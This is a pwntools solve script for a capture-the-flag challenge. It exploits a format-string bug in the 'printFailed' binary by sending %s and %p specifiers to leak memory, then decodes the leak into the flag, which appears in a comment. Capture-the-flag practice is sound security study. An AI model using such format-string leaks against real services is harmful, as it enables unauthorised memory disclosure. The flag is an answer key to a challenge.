from pwn import *
binf = ELF("printFailed")
libc = ELF.libc
#p = remote("chall.ctf.bamboofox.tw", 10102)
#p=process('flagDropper')
p=remote("printf.sdc.tf",1337)
gs = '''
break *0x555555554935
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return remote("printf.sdc.tf",1337)
        # return process("printFailed")

context.log_level = "DEBUG"
context.aslr = False
print(binf.plt)

# 0x5555555548b2 flag
# pwndbg> search 'AAAAAAAA'
# printFailed     0x555555755040 'AAAAAAAA %p %p %p %p %p %p %p %p %p %p '
# [heap]          0x555555757490 'AAAAAAAA 0x55555555486f 0x55555555482a 0x28 0x555555755080 0x7c 0x7fffffffdf48 0x155554720 0x7fffffffdf40 0x5555557562a0 (nil) wrong\n'
# [heap]          0x5555557578a0 0x4141414141414141 ('AAAAAAAA')

# for i in range(1,10):
#     p=start()
#     shell='%'+str(i)+'$s'+' %p '*200
#     p.sendafter('?\n',shell)
#     p.recvline()
#     print()
#     print('*'*60)
#     print('*'*30+' >> '+str(i)+' << '+'*'*30)
#     print(p.recvall().split(b' ')[1:3] )
#     print('*'*60)
#     print('*'*60)
#     print()

# for i in range(1,10):
i=4
p=start()
shell='%d %d %d %s'
# p.sendlineafter('?\n',shell)
p.sendlineafter('?\n',shell)
# p.recvline()
todo=p.recvall()
semiflag=todo.split(b' ')[-1].split(b'\n')[0]
semiflag_lista=''.join([chr(c-1) for c in semiflag])
print(semiflag_lista)
# p.interactive()

# sdctf{D0nt_b3_4_f41lur3_1ik3_tH1S_C0d3}
